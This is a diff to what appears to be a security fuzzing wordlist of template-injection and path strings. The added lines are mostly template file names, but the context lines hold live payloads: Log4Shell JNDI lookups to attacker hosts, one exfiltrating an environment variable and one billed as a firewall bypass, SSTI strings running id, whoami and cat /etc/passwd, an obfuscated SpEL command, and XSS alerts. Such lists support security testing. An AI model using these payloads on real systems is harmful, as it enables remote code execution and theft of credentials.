@@ -23,12 +23,32 @@ ${``[class extends[alert``]{}]}
 ${alert(1)}
 ${alert(1337)}`' autofocus
 ${app}.conf
+${baseentityname}dao.xml
+${bean.name}mapper.xml
 ${beanlower}_crud.xhtml.vm.conf
 ${beanlower}_edit.xhtml.groovy.conf
 ${beanlower}_list.xhtml.groovy.conf
 ${beanlower}_view.xhtml.groovy.conf
+${classname}.hbm.xml
+${classname}.xml.ftl
+${classname}_testdata.xml
+${classname}context.xml
+${classname}dao.xml
+${classname}daotest.xml
+${classname}extmapper.xml.ftl
+${classname}mapper.xml
+${classname}mapper.xml.ftl
+${classname}mappergen.xml.ftl
+${classname}mappper.xml
+${classname}sqlmap.xml
+${controllername}.${actionname}.xml.xqy
 ${donotexists|42*42}
 ${email}spectrum2011
+${empty}clouddataservicecontext.xml
+${empty}servicecontext.xml
+${entityname}mapper.xml
+${genname}mapper.xml
+${idfwbonavigation}.xml
 ${j${k8s:k5:-nd}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o} - aws firewall bypass
 ${jndi:dns://attacker.com/a}
 ${jndi:ldap://${env:user}.xyz.collab.com/a} - default payload
@@ -36,7 +56,9 @@ ${jndi:ldap://attacker.com/a}
 ${jndi:rmi://attacker.com/a}
 ${k3rn3l}
 ${pojo}.java.vm.conf
+${policyname}.xml
 ${projectname}.css.conf
+${proxyname}.xml
 ${self.__init__.__globals__['util'].os.system('id')}
 ${self.module.cache.compat.inspect.os.system("id")}
 ${self.module.filters.compat.inspect.os.system("id")}
@@ -44,6 +66,8 @@ ${self.module.runtime.compat.inspect.os.system("id")}
 ${self.module.runtime.util.os.system("id")}
 ${self.template.module.cache.util.os.system("id")}
 ${self.template.module.runtime.util.os.system("id")}
+${source-name}_additions.xml
+${sqlname}.xml
 ${t(java.lang.system).getenv()}
 ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec(t(java.lang.character).tostring(99).concat(t(java.lang.character).tostring(97)).concat(t(java.lang.character).tostring(116)).concat(t(java.lang.character).tostring(32)).concat(t(java.lang.character).tostring(47)).concat(t(java.lang.character).tostring(101)).concat(t(java.lang.character).tostring(116)).concat(t(java.lang.character).tostring(99)).concat(t(java.lang.character).tostring(47)).concat(t(java.lang.character).tostring(112)).concat(t(java.lang.character).tostring(97)).concat(t(java.lang.character).tostring(115)).concat(t(java.lang.character).tostring(115)).concat(t(java.lang.character).tostring(119)).concat(t(java.lang.character).tostring(100))).getinputstream())}${self.module.cache.util.os.system("id")}
 ${{3*3}}
@@ -75,6 +99,8 @@ ${{<%[%'"}}%\
 - "#{name.last_name}-#{name.last_name}"
 - "#{prefix} #{first_name} #{last_name}"
 -@{.vtjjzkjvm0dgx#pa{r
+/ libs / opensocial / makerequest {0}? url = {{0}}
+/ libs / opensocial / proxy {0}? container = default & url = {{0}}
 /%7b%7b$
 /*/%7b%7burl%20absolute=
 /.putty/{{hostname}}.ppk
@@ -293,7 +319,15 @@ ${{<%[%'"}}%\
 @{[system "touch /tmp/blns.fail"]}
 @{c:\windows\winstore\resources.pri?ms-resource://winstore/resources/displayname}
 @{{7*7}}
+@{{{{{{{
+@{{{{{{{{{{{
 a=`${alert/*}`;
+application-${clazz.classname}.xml.ftl
+application-${clazz.classname}.xml.ftl.svn-base
+application-${modulename}.xml.ftl
+application-${modulename}.xml.ftl.2.tmp
+application-${modulename}.xml.ftl.svn-base
+application-${modulename}.xml.ftl.tmp
 arraylength=${#paramsarray[*]}
 bin/wcm/contentfinder/connector/suggestions.json;%0aojh.css?query_term=path%3a/&pre={{randstr}}
 blog/*/{{ad_click_url}}
@@ -319,6 +353,7 @@ eval(`${`${`${`${`${`a`}`}`}`}`}${`${`${`${`${`l`}`}`}`}`}${`${`${`${`${`e`}`}`}
 eval(`ale${[[[[]=[]]=[[]=[]]]=[[]=[]]]=[]}rt(1)`);
 example available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7b%7b[].pop.constructor%26%2340%27alert%5cu00281%5cu0029%27%26%2341%26%2340%26%2341%7d%7d)
 file: {{$frame.file}}@{{$frame.line}}{{end}}
+filter_{{plural}}.xml
 firstchar="${payload:1:1}"
 for paramstring in ${paramsarray[*]}; do
 freelance-hspszhp/${deploy_dir}/${war.name.gdpos}/widget_report.jsp
@@ -390,6 +425,8 @@ libs/mcm/salesforce/customer{0}?checktype=authorize&authorization_url={{0}}&cust
 libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23
 libs/opensocial/makerequest{0}?url={{0}}
 libs/opensocial/proxy{0}?container=default&url={{0}}
+manual-${classname}mapper.xml
+manual-${classname}sqlmap.xml
 message: {{.message}}
 mozilla/5.0 (x11; u; linux i686 (x86_64); en-us; rv:1.8.1.6) gecko/20070817 iceweasel/2.0.0.6-g3{${print(238947899389478923-34567343546345)}}
 mparams=${out:0:lenminus1}
@@ -404,6 +441,7 @@ output=$output`echo ${paramsarray[$y]} | cut -d "=" -f1`"="$payload
 package: {{$frame.package}}
 paramtotest=`echo ${paramsarray[$y]} | cut -d "=" -f1`
 pass{{*11}}port
+pkg_{{package}}.xml
 plugin/src/test/webapp/includes/${param.secret_param}.jsp
 plugins/springmvc/template/web/${namespace}/${classname}/create.jsp
 plugins/springmvc/template/web/${namespace}/${classname}/edit.jsp
@@ -425,17 +463,28 @@ plugins/struts2/template/web/${namespace}/${classname}/edit.jsp
 plugins/struts2/template/web/${namespace}/${classname}/form_include.jsp
 plugins/struts2/template/web/${namespace}/${classname}/list.jsp
 plugins/struts2/template/web/${namespace}/${classname}/show.jsp
+products/{{item.link}}
 prompt`${document.domain}`
 q@{{tk5}}0p
 search?search_key={{1337*1338}}
 settimeout`alert(1);//${1000}`
 siat-1.0-source/src/view/src/${modulo}/${submodulo}/${bean}viewadapter.jsp
+sqlmap_${classname}.xml
+sqlmap_${tableclassname}.xml
 stringlength=${#input}
 stringlength=${#uriinputdecode}
 stringlength=${#uriinputencode}
+struts-${clazz.classname}.xml.ftl
+struts-${clazz.classname}.xml.ftl.svn-base
+struts-${modulename}.xml.ftl
+struts-${modulename}.xml.ftl.2.tmp
+struts-${modulename}.xml.ftl.svn-base
+struts-${modulename}.xml.ftl.tmp
+struts-config-${modulo}.xml
 supervisor_{{cookiecutter.repo_name}}.conf
 table_sharded_${shardnum}.changes.sql
 template/web/pages/${classnamelowercase}/base.jsp
+tiles-defs-${modulo}.xml
 timestamp: {{.timestamp}}
 uiasha&*^$%#((&@!(sdaduaihdl@*(&^&#*qpojaasd(*)((&@{}ijadaaosuhfiusfh
 unattended-upgrade::allowed-origins:: "${distro_id}:${distro_codename}";
@@ -463,6 +512,7 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
 {% import "os" %}{{ os.popen("whoami").read() }}
 {@pnv@{veq#nn_%t(gopb2]-caskjp{jxh!nvodz.{j9h2a$n0
+{@{{{{{{
 {{ ''.__class__.__mro__ }}
 {{ ''.__class__.__mro__[2].__subclasses__() }}
 {{ '7'*7 }}
@@ -479,6 +529,11 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{ oidc_playground_jwt_secret }}
 {{ request }}
 {{ self.template.module.os.popen('whoami').read() }}
+{{ theme sanitized }}.behaviors.js
+{{ theme sanitized }}.hacks.scss
+{{ theme sanitized }}.no-query.scss
+{{ theme sanitized }}.normalize.scss
+{{ theme sanitized }}.styles.scss
 {{# 7*7 }}
 {{$eval.constructor('alert(1)')()}}
 {{$i}}: {{$frame.function}}
@@ -500,6 +555,7 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{= tnn96}}
 {{=42*42}}
 {{=machine}}.conf
+{{@{{{{{
 {{['cat$ifs/etc/passwd']|filter('system')}}
 {{['cat\x20/etc/passwd']|filter('system')}}
 {{['id']|filter('system')}}
@@ -509,23 +565,34 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{a}}
 {{cheesecake.app_name}}.ini
 {{cheesecake.package_name}}.ini
+{{component}}.xml
 {{config.items()}}
 {{config}}
 {{constructor.constructor('alert(1)')()}}
+{{controller.item.name.lower}}.xml
 {{cookiecutter.app_name}}.ini
 {{cookiecutter.current_domain}}-uwsgi.ini
+{{cookiecutter.module_name}}_data.xml
+{{cookiecutter.module_name}}_demo_data.xml
+{{cookiecutter.module_name}}_view.xml
+{{cookiecutter.module_name}}_workflow.xml
 {{cookiecutter.plugin_name}}.conf
 {{cookiecutter.project_slug}}
+{{cookiecutter.project_slug}}_datamodel.xml
 {{cookiecutter.repo_name}}
 {{cookiecutter.repo_name}}/{{cookiecutter.repo_name}}/templates/404.html
 {{cookiecutter.repo_name}}/{{cookiecutter.repo_name}}/templates/500.html
 {{cookiecutter.repo_name}}/{{cookiecutter.repo_name}}/templates/base.html
+{{cookiecutter.stem_name}}.xml
+{{cookiecutter.stem_name}}_build.xml
 {{cycler.__init__.__globals__.os}}
 {{data.c.link_offerid}}
 {{dump(app)}}
 {{else}}
 {{endpoints}}
 {{end}}
+{{extension.element.lower}}.xml
+{{extension.name.lower}}.xml
 {{filepath}}{{bakext}}
 {{if .message }}
 {{item.url}}
@@ -538,7 +605,10 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{locale}}.plg_{{group}}_{{name}}.sys.ini
 {{namespace.__init__.__globals__.os}}
 {{namespace.__init__.__globals__.os}}${{<%[%'"}}%\
+{{name}}-manifest.xml
 {{name}}.conf
+{{name}}.xml
+{{opkg.name}}_view.xml
 {{page}}
 {{path_to_check}}
 {{paths}}
@@ -556,11 +626,16 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{self.__dict__}}
 {{self}}
 {{settings}}
+{{singular}}.xml
+{{targetname}}.xml
 {{timestamp}}_create_{{name}}.sql.ecr
 {{timestamp}}_{{name}}.sql.ecr
 {{tnn96}}
 {{url}}
 {{{42*42}}}
 {{{7*7}}}
+{{{{@{{{
+{{{{@{{{{{{{
+{{{{{@{{{{{{
 {{{}.tostring.constructor('confirm(1)')()}}
 }aj;5a&hl@{z
